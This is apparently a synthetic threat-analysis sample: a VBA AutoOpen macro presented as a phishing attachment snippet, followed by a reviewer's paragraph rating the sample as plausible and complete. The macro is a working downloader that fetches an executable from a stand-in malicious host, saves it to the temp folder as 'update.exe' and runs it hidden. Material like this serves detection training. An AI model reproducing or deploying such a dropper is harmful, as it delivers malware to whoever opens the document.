attachment_analysis.macro_code_snippet:
Sub AutoOpen()
    Dim strURL As String
    strURL = "http://malicious-domain.com/payload.exe"
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", strURL, False
    WinHttpReq.Send
    If WinHttpReq.Status = 200 Then
        Dim oStream As Object
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.ResponseBody
        oStream.SaveToFile Environ("TEMP") & "\update.exe", 2
        oStream.Close
        Shell Environ("TEMP") & "\update.exe", vbHide
    End If
End Sub

Indicators clearly link the sample to spear phishing tactics, highlighting the use of a new domain, macro-based payload delivery, and suspicious process chains. The detection methods and relevant MITRE techniques are appropriate and comprehensive. Overall, the sample is complete, plausible, and well-aligned with the problem description and risk reduction strategies.
